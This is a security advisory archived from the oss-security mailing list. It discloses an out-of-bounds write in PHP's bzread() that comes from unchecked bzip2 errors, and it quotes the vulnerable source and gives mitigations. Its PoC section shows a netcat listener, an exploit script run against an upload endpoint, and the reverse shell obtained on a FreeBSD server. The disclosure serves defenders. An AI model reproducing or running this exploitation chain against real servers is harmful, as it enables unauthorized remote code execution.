  oss-security - php: out-of-bounds write in bzread()            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Thu, 21 Jul From: Hans Jerry Illikainen <hji@...topia.com> To: bugtraq@...urityfocus.com, fulldisclosure@...lists.org, oss-security@...ts.openwall.com Subject: php: out-of-bounds write in bzread()  PHP and does not perform adequate error handling in its `bzread()' function:  ,---- | static PHP_FUNCTION(bzread) | { | ... |     ZSTR_LEN(data) = php_stream_read(stream, ZSTR_VAL(data), ZSTR_LEN(data)); |     ZSTR_VAL(data)[ZSTR_LEN(data)] = '\0'; | |     RETURN_NEW_STR(data); | } `----  ,---- | php_stream_ops php_stream_bz2io_ops = { |     php_bz2iop_write, php_bz2iop_read, |     php_bz2iop_close, php_bz2iop_flush, |     "BZip2", |     NULL, /* seek */ |     NULL, /* cast */ |     NULL, /* stat */ |     NULL  /* set_option */ | }; `----  ,---- | /* {{{ BZip2 stream implementation */ | | static size_t php_bz2iop_read(php_stream *stream, char *buf, size_t count) | { |     struct php_bz2_stream_data_t *self = (struct php_bz2_stream_data_t *)stream->abstract; |     size_t ret = 0; | |     do { |         int just_read; | ... |         just_read = BZ2_bzread(self->bz_file, buf, to_read); | |         if (just_read < 1) { |             stream->eof = 0 == just_read; |             break; |         } | |         ret += just_read; |     } while (ret < count); | |     return ret; | } `----  The erroneous return values for Bzip2 are as follows:  ,---- | #define BZ_SEQUENCE_ERROR    (-1) | #define BZ_PARAM_ERROR       (-2) | #define BZ_MEM_ERROR         (-3) | #define BZ_DATA_ERROR        (-4) | #define BZ_DATA_ERROR_MAGIC  (-5) | #define BZ_IO_ERROR          (-6) | #define BZ_UNEXPECTED_EOF    (-7) | #define BZ_OUTBUFF_FULL      (-8) | #define BZ_CONFIG_ERROR      (-9) `----  Should the invocation of BZ2_bzread() fail, the loop would simply be broken out of and execution would continue with bzread() returning RETURN_NEW_STR(data).  According to the manual [1], bzread() returns FALSE on error; however that does not seem to ever happen.  Due to the way that the bzip2 library deals with state, this could result in an exploitable condition if a user were to call bzread() after an error, eg:  ,---- | $data = ""; | while (!feof($fp)) { |     $res = bzread($fp); |     if ($res === FALSE) { |         exit("ERROR: bzread()"); |     } |     $data .= $res; | } `----   Exploitation ============  One way the lack of error-checking could be abused is through out-of-bound writes that may occur when `BZ2_decompress()' (BZ2_bzread() -> BZ2_bzRead() -> BZ2_bzDecompress() -> BZ2_decompress()) processes the `pos' array using user-controlled selectors as indices:  ,---- | Int32 BZ2_decompress ( DState* s ) | { |    UChar      uc; |    Int32      retVal; | ... |    /* stuff that needs to be saved/restored */ |    Int32  i; |    Int32  j; | ... |    Int32  nGroups; |    Int32  nSelectors; | ... |    /*restore from the save area*/ |    i           = s->save_i; |    j           = s->save_j; | ... |    nGroups     = s->save_nGroups; |    nSelectors  = s->save_nSelectors; | ... |    switch (s->state) { | ... |       /*--- Now the selectors ---*/ |       GET_BITS(BZ_X_SELECTOR_1, nGroups, 3); |       if (nGroups < 2 || nGroups > 6) RETURN(BZ_DATA_ERROR); |       GET_BITS(BZ_X_SELECTOR_2, nSelectors, 15); |       if (nSelectors < 1) RETURN(BZ_DATA_ERROR); |       for (i = 0; i < nSelectors; i++) { |          j = 0; |          while (True) { |             GET_BIT(BZ_X_SELECTOR_3, uc); |             if (uc == 0) break; |             j++; |             if (j >= nGroups) RETURN(BZ_DATA_ERROR); |          } |          s->selectorMtf[i] = j; |       } | |       /*--- Undo the MTF values for the selectors. ---*/ |       { |          UChar pos[BZ_N_GROUPS], tmp, v; |          for (v = 0; v < nGroups; v++) pos[v] = v; | |          for (i = 0; i < nSelectors; i++) { |             v = s->selectorMtf[i]; |             tmp = pos[v]; |             while (v > 0) { pos[v] = pos[v-1]; v--; } |             pos[0] = tmp; |             s->selector[i] = tmp; |          } |       } | | ... |    save_state_and_return: | |    s->save_i           = i; |    s->save_j           = j; | ... |    s->save_nGroups     = nGroups; |    s->save_nSelectors  = nSelectors; | ... |    return retVal; | } `----  ,---- | #define GET_BIT(lll,uuu)                          \ |    GET_BITS(lll,uuu,1) `----  ,---- | #define GET_BITS(lll,vvv,nnn)                     \ |    case lll: s->state = lll;                      \ |    while (True) {                                 \ | ... |    } `----  If j >= nGroups BZ2_decompress() would save its state and return BZ_DATA_ERROR.  If the caller don't act on the erroneous retval, but rather invokes BZ2_decompress() again, the saved state would be restored (including `i' and `j') and the switch statement would transfer execution to the BZ_X_SELECTOR_3 case -- ie. the preceding initialization of `i = 0' and `j = 0' would not be executed.  In pseudocode it could be read as something like:  ,---- | i = s->save_i; | j = s->save_j; |  | switch (s->state) { | case BZ_X_SELECTOR_2: |     s->state = BZ_X_SELECTOR_2; |  |     nSelectors = get_15_bits... |  |     for (i = 0; i < nSelectors; i++) { |         j = 0; |         while (True) { |             goto iter; | case BZ_X_SELECTOR_3: | iter: |     s->state = BZ_X_SELECTOR_3; |  |     uc = get_1_bit... |  |     if (uc == 0) goto done; |     j++; |     if (j >= nGroups) { |         retVal = BZ_DATA_ERROR; |         goto save_state_and_return; |     } |     goto iter; | done: |     s->selectorMtf[i] = j; `----  An example selector with nGroup=6: ,---- | | ||||| `|||||| `- goto done; s->selectorMtf[i] = 13; |  `Â´     j++; | j++;    goto save_state_and_return; | goto iter; `----  Since the selectors are used as indices to `pos' in the subsequent loop, an `nSelectors' amount of <= - BZ_N_GROUPS bytes out-of-bound writes could occur if BZ2_decompress() is invoked in spite of a previous error.  ,---- |          UChar pos[BZ_N_GROUPS], tmp, v; |          for (v = 0; v < nGroups; v++) pos[v] = v; | |          for (i = 0; i < nSelectors; i++) { |             v = s->selectorMtf[i]; |             tmp = pos[v]; |             while (v > 0) { pos[v] = pos[v-1]; v--; } |             pos[0] = tmp; |             s->selector[i] = tmp; |          } `----  ,---- | #define BZ_N_GROUPS 6 `----   PoC ===  Against FreeBSD amd64 with php-fpm and nginx from the official repo [2]:  ,---- | $ nc -v -l & | Listening on (family 0, port |  | $ python exploit.py --ip --port http://target/upload.php | [*] sending archive to http://target/upload.php (0) |  | Connection from [target] port [tcp/*] accepted (family 2, sport | $ fg | id | uid=80(www) gid=80(www) groups=80(www) |  | uname -imrsU | FreeBSD amd64 GENERIC |  | /usr/sbin/pkg query -g "=> %n-%v" php* | => | => |  | cat upload.php | <?php | $fp = bzopen($_FILES["file"]["tmp_name"], "r"); | if ($fp === FALSE) { |     exit("ERROR: bzopen()"); | } |  | $data = ""; | while (!feof($fp)) { |     $res = bzread($fp); |     if ($res === FALSE) { |         exit("ERROR: bzread()"); |     } |     $data .= $res; | } | bzclose($fp); | ?> `----   Solution ========  This issue has been assigned and can be mitigated by calling bzerror() on the handle between invocations of bzip2.  Another partial solution has been introduced in PHP and whereby the stream is marked as EOF when an error is encountered; allowing this flaw to be avoided by using feof().  However, the PHP project considers this to be an issue in the underlying bzip2 library[3].    Footnotes _________  [1] [https://secure.php.net/manual/en/function.bzread.php]  [2]  [3]   --  Hans Jerry Illikainen  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      